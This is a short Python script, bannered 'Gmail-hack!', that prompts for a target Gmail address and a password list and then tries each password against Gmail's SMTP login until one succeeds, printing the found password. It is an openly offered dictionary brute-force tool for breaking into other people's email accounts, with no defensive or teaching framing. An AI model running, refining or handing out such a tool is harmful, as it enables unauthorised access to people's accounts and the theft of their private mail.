import smtplib
from os import system
def artwork():
    print("\n")
    print("##########################################################")
    print("#                                                        #")
    print("#                     \||/                               #")
    print("#                     |  @___oo                          #")
    print("#           /\  /\   / (__,,,,|                          #")
    print("#          ) /^\) ^\/ _)                Gmail-hack!      #")
    print("#          )   /^\/   _)                CoDeD By:        #")
    print("#          )   _ /  / _)                AnonyminHack5    #")
    print("#      /\  )/\/ ||  | )_)                                #")
    print("#     <  >      |(,,) )__)                               #")
    print("#      ||      /    \)___)\                              #")
    print("#      | \____( Hack  )___) )___                          #")
    print("#      \______(_______;;; __;;;                          #")
    print("#                                                        #")
    print("##########################################################")
    print("\n")

artwork()

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter The Target Gmail Adress => ")

print("\n")

pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '2' to add a custom password list\n => ")

if pwd=='0':
    passswfile="Passwords.txt"

else :
    print("\n")
    passswfile = input("Name The File Path (For Password List) => ")

passswfile = open(passswfile, "r")

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print("[+] Password Found %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[!] Pasword Is Wrong. %s " % password)